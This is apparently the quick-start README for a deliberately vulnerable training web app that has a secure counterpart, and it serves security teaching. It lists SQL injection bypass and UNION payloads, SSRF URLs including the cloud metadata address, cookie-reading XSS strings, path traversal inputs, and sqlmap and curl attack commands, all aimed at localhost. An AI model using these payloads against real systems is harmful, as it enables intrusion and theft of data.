# Quick Start Guide

## 🚀 Running the Applications

### Vulnerable Application

#### Backend
```bash
cd vulnerable-app/backend
npm install
npm run dev
```

The vulnerable backend will run on **http://localhost:3000**

#### Frontend
Open `vulnerable-app/frontend/index.html` in your browser, or serve it:

```bash
cd vulnerable-app/frontend
python3 -m http.server 8080
```

Then visit **http://localhost:8080**

---

### Secure Application

#### Backend
```bash
cd secure-app/backend
npm install
npm run dev
```

The secure backend will run on **http://localhost:3001**

#### Frontend
Open `secure-app/frontend/index.html` in your browser, or serve it:

```bash
cd secure-app/frontend
python3 -m http.server 8081
```

Then visit **http://localhost:8081**

---

## 🧪 Testing Vulnerabilities

### Default Credentials
- **Username:** admin / **Password:** admin123
- **Username:** user / **Password:** password
- **Username:** testuser / **Password:** test123

### SQL Injection Examples

#### Login Bypass
```
Username: admin' OR '1'='1'--
Password: anything
```

#### Data Extraction
```
Search: ' UNION SELECT id, username, password, email, role, bio FROM users--
```

### SSRF Examples

#### Internal Service Access
```
URL: http://localhost:3000/api/debug/info
URL: http://127.0.0.1:3000/api/users/search?q=admin
```

#### Cloud Metadata (if running on cloud)
```
URL: http://169.254.169.254/latest/meta-data/
```

### XSS Examples

#### Stored XSS in Bio
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert('XSS')>
```

### Path Traversal Examples
```
Path: .
Path: ..
Path: ../server.js
Path: ../package.json
```

---

## 📁 Project Structure

```
vulnerable-website/
├── README.md
├── vulnerable-app/
│   ├── backend/
│   │   ├── package.json
│   │   └── server.js          # Vulnerable Express server
│   └── frontend/
│       ├── index.html          # UI for testing vulnerabilities
│       ├── styles.css
│       └── app.js
├── secure-app/
│   ├── backend/
│   │   ├── package.json
│   │   └── server.js          # Secure implementation
│   └── frontend/
│       ├── index.html          # Secure UI
│       ├── styles.css
│       └── app.js
└── docs/
    ├── exploitation-guide.md   # Detailed exploitation techniques
    ├── remediation-guide.md    # Security fixes
    └── owasp-mapping.md        # OWASP Top 10 mapping
```

---

## 🔍 API Endpoints

### Vulnerable API (Port 3000)

| Method | Endpoint | Vulnerability |
|--------|----------|---------------|
| POST | `/api/login` | SQL Injection |
| POST | `/api/import-github` | SSRF |
| POST | `/api/request-reset` | Non-expiring tokens |
| POST | `/api/reset-password` | Token reuse |
| GET | `/api/users/search` | SQL Injection |
| POST | `/api/users/:id/bio` | Stored XSS |
| GET | `/api/users/:id` | XSS rendering |
| GET | `/api/files` | Path Traversal |
| GET | `/api/debug/info` | Information Disclosure |
| GET | `/api/health` | Information Disclosure |

### Secure API (Port 3001)

Same endpoints but with security controls:
- ✅ Parameterized queries
- ✅ Input validation
- ✅ XSS protection
- ✅ SSRF protection
- ✅ Token expiration
- ✅ Security headers
- ✅ Rate limiting

---

## 🛠️ Testing Tools

### Automated Scanners
```bash
# SQL Injection
sqlmap -u "http://localhost:3000/api/users/search?q=test" --batch

# Security headers
curl -I http://localhost:3000

# Comprehensive scan
nikto -h http://localhost:3000
```

### Manual Testing
```bash
# Test SQL Injection
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1'\''--","password":"test"}'

# Test SSRF
curl -X POST http://localhost:3000/api/import-github \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3000/api/debug/info","userId":1}'

# Test Path Traversal
curl "http://localhost:3000/api/files?path=../server.js"
```

### Browser Testing
- **Burp Suite** - Comprehensive web security testing
- **OWASP ZAP** - Automated vulnerability scanning
- **Browser DevTools** - XSS and client-side testing

---

## 📚 Learning Resources

### Documentation
- [Exploitation Guide](./docs/exploitation-guide.md) - Detailed attack techniques
- [Remediation Guide](./docs/remediation-guide.md) - Security fixes
- [OWASP Mapping](./docs/owasp-mapping.md) - OWASP Top 10 coverage

### External Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [HackTheBox](https://www.hackthebox.com/) - Practice platform
- [TryHackMe](https://tryhackme.com/) - Learning platform

---

## ⚠️ Important Warnings

### DO NOT:
- ❌ Deploy to production
- ❌ Expose to the internet
- ❌ Use on systems you don't own
- ❌ Store real credentials
- ❌ Use for malicious purposes

### DO:
- ✅ Use in isolated environments only
- ✅ Use for learning and research
- ✅ Study the secure implementations
- ✅ Practice responsible disclosure
- ✅ Share knowledge ethically

---

## 🎓 Educational Goals

This project is designed to help you:

1. **Understand Vulnerabilities** - See real-world security flaws in action
2. **Learn Exploitation** - Practice penetration testing techniques safely
3. **Implement Fixes** - Compare vulnerable vs secure code
4. **Map to OWASP** - Understand industry security standards
5. **Build Secure Apps** - Apply best practices in your projects

---

## 🐛 Troubleshooting

### Backend won't start
```bash
# Check if port is already in use
lsof -i :3000
lsof -i :3001

# Kill existing process
kill -9 <PID>
```

### Dependencies won't install
```bash
# Clear npm cache
npm cache clean --force

# Delete node_modules and reinstall
rm -rf node_modules package-lock.json
npm install
```

### CORS errors
Make sure:
- Backend is running on the correct port
- Frontend is accessing the correct API_BASE URL
- Check browser console for errors

---

## 📝 License

MIT License - For Educational Purposes Only

## 🤝 Contributing

This is an educational project. If you find additional vulnerabilities or improvements:
1. Document the vulnerability
2. Provide exploitation steps
3. Show the secure implementation
4. Map to OWASP/CWE standards

---

## 🎯 Next Steps

1. ✅ Install and run both applications
2. ✅ Test each vulnerability manually
3. ✅ Try automated tools
4. ✅ Compare vulnerable vs secure code
5. ✅ Read the documentation
6. ✅ Apply learnings to your projects

Happy (ethical) hacking! 🔒
